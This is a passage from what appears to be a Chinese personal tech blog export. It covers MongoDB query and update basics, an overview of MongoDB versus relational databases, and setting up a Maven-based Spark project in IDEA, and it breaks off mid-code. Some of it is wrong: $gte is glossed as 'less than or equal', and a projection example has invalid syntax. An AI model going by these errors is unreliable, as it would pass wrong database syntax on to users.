class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>查询条件对照表</p><table><thead><tr><th><strong>SQL</strong></th><th><strong>MQL</strong></th></tr></thead><tbody><tr><td>a = 1</td><td>{a: 1}</td></tr><tr><td>a &lt;&gt; 1</td><td>{a: {$ne: 1}}</td></tr><tr><td>a &gt; 1</td><td>{a: {$gt: 1}}</td></tr><tr><td>a &gt;= 1</td><td>{a: {$gte: 1}}</td></tr><tr><td>a &lt; 1</td><td>{a: {$lt: 1}}</td></tr><tr><td>a &lt;= 1</td><td>{a: {$lte: 1}}</td></tr><tr><td>a = 1 AND b = 1</td><td>{a: 1, b: 1}或{$and: [{a: 1}, {b: 1}]}</td></tr><tr><td>a = 1 OR b = 1</td><td>{$or: [{a: 1}, {b: 1}]}</td></tr><tr><td>a IS NULL</td><td>{a: {$exists: false}}</td></tr><tr><td>a IN (1, 2, 3)</td><td>{a: {$in: [1, 2, 3]}}</td></tr></tbody></table></li><li><p>查询逻辑运算符</p><ul><li>$lt：存在并小于</li><li>$lte：存在并小于等于</li><li>$gt：存在并大于</li><li>$gte：存在并小于等于</li><li>$ne：不存在或存在但不等于</li><li>$in：存在并在指定数组中</li><li>$nin：不存在或不在指定数组中</li><li>$or：匹配两个或多个条件中的一个</li><li>$and：匹配全部条件</li></ul></li><li><p>使用 find 搜索子文档</p><ul><li>db.fruit.find({“from.country”: “China”}) // ✔️ 正确</li><li>db.fruit.find({“from”: {country: “China”}}) // ❎ 错误</li></ul></li><li><p>控制 find 返回的字段</p><ul><li>find 可以指定只返回指定的字段</li><li>_id 字段必须明确指明不返回，否则默认返回</li><li>在 MongoDB 中我们称这为投影（projection）</li><li><strong>db.movies.find({“category”: “action”}, {“_id”, 0, title: 1})</strong> // 不返回_id，返回 title</li></ul></li></ul><h3 id="删除-使用-remove-删除文档"><a href="#删除-使用-remove-删除文档" class="headerlink" title="删除 - 使用 remove 删除文档"></a>删除 - 使用 remove 删除文档</h3><ul><li>remove 命令需要配合查询条件使用</li><li>匹配查询条件的文档会被删除</li><li>指定一个空条件会删除所有文档</li><li>示例：</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">db.testcol.remove({a: 1}) // 删除a等于1的记录db.testcol.remove({a: {$lt: 5}}) // 删除a小于5的记录db.testcol.remove({}) // 删除所有记录db.testcol.remove() // 报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="更新-使用-update-更新文档"><a href="#更新-使用-update-更新文档" class="headerlink" title="更新 - 使用 update 更新文档"></a>更新 - 使用 update 更新文档</h3><ul><li>Update 操作执行格式：<strong>db.&lt;集合&gt;.update(&lt;查询条件&gt;, &lt;更新字段&gt;)</strong></li><li>示例：</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">// 查询 name 为 apple的记录，并将找到记录的 from 设置为 Chinadb.fruit.updateOne({name: "apple"}, {$set: {from: "China"}})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>使用 updateOne 表示无论条件匹配多少条记录，默认更新第一条</li><li>使用 updateMany 表示条件匹配多少条就更新多少条</li><li>updateOne/updateMany 方法要求更新条件部分必须具有以下条件之一，否则将报错：<ul><li>$set/$unset</li><li>$push/pushAll/$pop</li><li>$pull/$pullAll</li><li>$addToSet</li></ul></li><li>操作条件<table><thead><tr><th><strong>操作条件</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>$push</td><td>增加一个对象到数组底部</td></tr><tr><td>$pushAll</td><td>增加多个对象到数组底部</td></tr><tr><td>$pop</td><td>从数组底部删除一个对象</td></tr><tr><td>$pull</td><td>如果匹配指定的值，从数组中相应的对象</td></tr><tr><td>$pullAll</td><td>如果匹配任意的值，从数组中相应的对象</td></tr><tr><td>$addToSet</td><td>如果不存在则增加一个值到数组</td></tr></tbody></table></li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于MongoDB</title>
      <link href="/post/34fcf34a.html"/>
      <url>/post/34fcf34a.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于-MongoDB"><a href="#关于-MongoDB" class="headerlink" title="关于 MongoDB"></a>关于 MongoDB</h1><h2 id="一、基本问题"><a href="#一、基本问题" class="headerlink" title="一、基本问题"></a>一、基本问题</h2><table><thead><tr><th><strong>问题</strong></th><th><strong>解答</strong></th></tr></thead><tbody><tr><td>什么是 MongoDB？</td><td>一个以 JSON 为数据模型的文档数据库</td></tr><tr><td>为什么叫文档数据库？</td><td>文档来自于“JSON document”，并非我们一般理解的 PDF、Word 文档</td></tr><tr><td>谁开发 MongoDB？</td><td>上市公司 MongoDB Inc.，总部位于美国纽约。</td></tr><tr><td>主要用途</td><td>应用数据库，类似于 Oracle、MySQL</td></tr><tr><td>海量数据处理，数据平台</td><td></td></tr><tr><td>主要特点</td><td>建模为可选</td></tr></tbody></table><p>JSON 数据模型比较适合开发者<br>横向扩展可以支撑很大数据量和并发 |<br>| MongoDB 是免费的吗？ | MongoDB 有两个发布版本：社区版和企业版。<br>社区版是基于 SSPL，一种和 AGPL 基本类似的开源协议<br>企业版是基于商业协议，需付费使用 |</p><h2 id="二、版本变迁"><a href="#二、版本变迁" class="headerlink" title="二、版本变迁"></a>二、版本变迁</h2><p>0.x：起步阶段（2008）<br>1.x：支持复制集和分片集（2010）<br>2.x：更丰富的数据库功能（2012）<br>3.x：WiredTiger 和周边生态环境（2014）<br>4.x：分布式事务支持（2018）</p><h2 id="三、MongoDB-vs-关系型数据库"><a href="#三、MongoDB-vs-关系型数据库" class="headerlink" title="三、MongoDB vs 关系型数据库"></a>三、MongoDB vs 关系型数据库</h2><table><thead><tr><th><strong>-</strong></th><th><strong>MongoDB</strong></th><th><strong>RDBMS</strong></th></tr></thead><tbody><tr><td>数据模型</td><td>文档模型</td><td>关系模型</td></tr><tr><td>数据库类型</td><td>OLTP</td><td>OLTP</td></tr><tr><td>CRUD 操作</td><td>MQL/SQL</td><td>SQL</td></tr><tr><td>高可用</td><td>复制集</td><td>集群模式</td></tr><tr><td>横向扩展能力</td><td>通过原生分片完善支持</td><td>数据分区或者应用侵入式</td></tr><tr><td>索引支持</td><td>B-树、全文索引、地理位置索引、多键(multikey)索引、TTL 索引</td><td>B-树</td></tr><tr><td>开发难度</td><td>容易</td><td>困难</td></tr><tr><td>数据容量</td><td>没有理论上限</td><td>千万、亿</td></tr><tr><td>扩展方式</td><td>垂直扩展+水平扩展</td><td>垂直扩展</td></tr></tbody></table><h2 id="MongoDB-优势"><a href="#MongoDB-优势" class="headerlink" title="MongoDB 优势"></a>MongoDB 优势</h2><h3 id="优势概述"><a href="#优势概述" class="headerlink" title="优势概述"></a>优势概述</h3><p>面向开发者的易用+高效数据库</p><h4 id="1-简单直观"><a href="#1-简单直观" class="headerlink" title="1. 简单直观"></a>1. 简单直观</h4><p>以自然的方式拉建模，以直观的方式来与数据库交互</p><h4 id="2-结构灵活"><a href="#2-结构灵活" class="headerlink" title="2. 结构灵活"></a>2. 结构灵活</h4><p>弹性模式从容响应需求的频繁变化</p><h4 id="3-快速开发"><a href="#3-快速开发" class="headerlink" title="3. 快速开发"></a>3. 快速开发</h4><p>做更多的事，写更少的代码</p><h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3><h3 id="灵活：快速响应业务变化"><a href="#灵活：快速响应业务变化" class="headerlink" title="灵活：快速响应业务变化"></a>灵活：快速响应业务变化</h3><p>可动态添加新字段</p><ul><li>多形性：同一个集合中可以包含不同字段（类型）的文档对象</li><li>动态性：线上修改数据模式，修改是应用与数据库均无需下线</li><li>数据治理：支持使用 JSON Schema 来规范数据模式。在保证模式灵活动态的前提下，提供数据治理能力</li></ul><h2 id="快速：最简单快速的开发方式"><a href="#快速：最简单快速的开发方式" class="headerlink" title="快速：最简单快速的开发方式"></a>快速：最简单快速的开发方式</h2><ul><li>JSON 模型之快速特性：<ul><li>数据库引擎只需要在一个存储区读写</li><li>反范式、无关联的组织极大优化查询速度</li><li>程序 API 自然，开发快速</li></ul></li></ul><h3 id="原生的高可用"><a href="#原生的高可用" class="headerlink" title="原生的高可用"></a>原生的高可用</h3><ul><li>Replica Set - 2 to 50 个</li><li>自恢复</li><li>多中心容灾能力</li><li>滚动服务 - 最小化服务终端</li></ul><h3 id="横向扩展能力"><a href="#横向扩展能力" class="headerlink" title="横向扩展能力"></a>横向扩展能力</h3><ul><li>需要的时候无缝扩展</li><li>应用全透明</li><li>多种数据分布策略</li><li>轻松支持 TB - PB 数量级</li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA+Maven开发Spark应用</title>
      <link href="/post/1ec6df48.html"/>
      <url>/post/1ec6df48.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建-Maven-项目"><a href="#一、创建-Maven-项目" class="headerlink" title="一、创建 Maven 项目"></a>一、创建 Maven 项目</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617890879763-d282d8de-7645-4379-b637-bd6184718bd6.png#height=448&amp;id=wLC8j&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=896&amp;originWidth=1141&amp;originalType=binary%E2%88%B6=1&amp;size=122925&amp;status=done&amp;style=none&amp;width=570.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891006508-8989d2c5-be7f-4b69-b629-04a0efe4381e.png#height=448&amp;id=HKPkV&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=896&amp;originWidth=1141&amp;originalType=binary%E2%88%B6=1&amp;size=47109&amp;status=done&amp;style=none&amp;width=570.5" alt="image.png"></p><h2 id="二、配置-Maven"><a href="#二、配置-Maven" class="headerlink" title="二、配置 Maven"></a>二、配置 Maven</h2><p>右键 pom.xml ，选择 Maven-&gt;打开’settings.xml’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891096516-4f1b4d73-cc30-4d02-aadf-35b64fc92b96.png#height=658&amp;id=pjAN4&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1315&amp;originWidth=1610&amp;originalType=binary%E2%88%B6=1&amp;size=235544&amp;status=done&amp;style=none&amp;width=805" alt="image.png"><br>修改配置为：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>settings</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.0.0<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.0.0                      http://maven.apache.org/xsd/settings-1.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localRepository</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interactiveMode</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>usePluginRegistry</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>offline</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pluginGroups</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servers</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>阿里云公共仓库<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>repo1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>central repo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo1.maven.org/maven2/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>apache snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>阿里云阿帕奇仓库<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/apache-snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proxies</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeProfiles</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profiles</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repositories</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/public<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>layout</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>layout</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>releases</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>enabled</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>enabled</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>releases</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>snapshots</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>enabled</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>enabled</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>snapshots</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>MavenCentral<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo1.maven.org/maven2/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmavenApache<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/apache-snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repositories</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profiles</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>settings</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、配置-pom-xml"><a href="#三、配置-pom-xml" class="headerlink" title="三、配置 pom.xml"></a>三、配置 pom.xml</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>Demo3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.source</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.source</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.target</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.target</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scala.version</span><span class="token punctuation">></span></span>2.12.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scala.version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spark.version</span><span class="token punctuation">></span></span>3.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spark.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--scala--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.scala-lang<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>scala-library<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${scala.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--spark--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.spark<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spark-core_2.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${spark.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--hadoop--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.hadoop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hadoop-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>右键 pom.xml，选择 Maven -&gt; 重新加载项目<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891322052-31e5364f-eff9-4789-9fb6-4846d01f5509.png#height=630&amp;id=v7flg&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1260&amp;originWidth=1711&amp;originalType=binary%E2%88%B6=1&amp;size=253795&amp;status=done&amp;style=none&amp;width=855.5" alt="image.png"></p><h2 id="四、编写-Spark-程序"><a href="#四、编写-Spark-程序" class="headerlink" title="四、编写 Spark 程序"></a>四、编写 Spark 程序</h2><ol><li>在 main 包下新建 scala 目录，并调整为 suorces root</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891626321-cac1f8a6-b516-4d0e-b133-6efc720bd172.png#height=527&amp;id=Lwab2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1053&amp;originWidth=1781&amp;originalType=binary%E2%88%B6=1&amp;size=207611&amp;status=done&amp;style=none&amp;width=890.5" alt="image.png"></p><ol start="2"><li>在 test 包下新建 scala 目录，并调整为 test suorces root</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891761794-7a10e6d4-6426-48af-8722-581c004ed614.png#height=615&amp;id=foLE3&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1229&amp;originWidth=1753&amp;originalType=binary%E2%88%B6=1&amp;size=220334&amp;status=done&amp;style=none&amp;width=876.5" alt="image.png"></p><ol start="3"><li>为项目添加 scala 支持</li></ol><p>右键项目名称，选择-&gt;添加框架支持<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617892276004-83906431-b318-4135-b141-f44015503dd2.png#height=519&amp;id=rz19M&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1038&amp;originWidth=1613&amp;originalType=binary%E2%88%B6=1&amp;size=136596&amp;status=done&amp;style=none&amp;width=806.5" alt="image.png"></p><ol start="4"><li>在 main/scala 下添加软件包，然后创建 Scala 类-&gt;Object</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617892415368-fa48e8be-6e41-4116-9cc0-a9419c34a860.png#height=548&amp;id=vofCG&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1095&amp;originWidth=1550&amp;originalType=binary%E2%88%B6=1&amp;size=181839&amp;status=done&amp;style=none&amp;width=775" alt="image.png"></p><ol start="5"><li>词频统计 Demo</li></ol><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">package</span> org<span class="token punctuation">.</span>simple<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token 